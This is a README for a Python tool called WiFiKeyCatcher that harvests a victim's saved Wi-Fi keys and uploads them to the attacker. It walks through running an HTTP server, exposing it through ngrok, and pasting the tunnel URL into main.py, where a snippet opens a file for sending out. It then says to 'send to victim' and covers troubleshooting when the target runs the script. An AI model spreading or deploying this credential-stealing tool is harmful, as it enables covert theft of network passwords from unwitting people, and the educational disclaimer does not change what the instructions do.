<p align="center">
  <img src="https://logos-world.net/wp-content/uploads/2022/03/Wi-Fi-Logo.png"/>
</p>
 <h3><p align="center">
    ⚠️ Disclaimer: This repository is intended for educational purposes exclusively. I bear no responsibility for any illicit or unauthorized use of this project.
</p></h3>
</p>
<p align="center">
  <img src="https://img.shields.io/badge/Version-0.0.1-green" alt=""/>
  <img src="https://img.shields.io/badge/Written in-Python-blue" alt=""/>
  <img src="https://img.shields.io/badge/Author-Ibn Aleem-red" alt=""/>
</p>

# Setup
1. Clone this repository:
```
$ git clone https://github.com/ibnaleem/WiFiKeyCatcher.git
```
2. Run `HTTPServer`:
```
$ py -m http.server
```
3. [Install ngrok](https://ngrok.com/download)
4. Configure auth-token in terminal:
```
$ ngrok config add-authtoken <token>
```
5. Start tunnel on port 8000:
```
$ ngrok http 80
```
If successfull, you should see all of your system directories as embeded links.

6, Copy ngrok URL and paste into `main.py` (line 52):
```python
url = "https://ngrok-url-here"
files = {'file': open(f'{curr_path}.txt', 'rb')}
```

Save and send to victim. Note: ngrok must be running to obtain WiFi-Keys

#### Target Ran Script, Nothing Received
Make sure your target has Python installed, and you're running HTTP server + ngrok
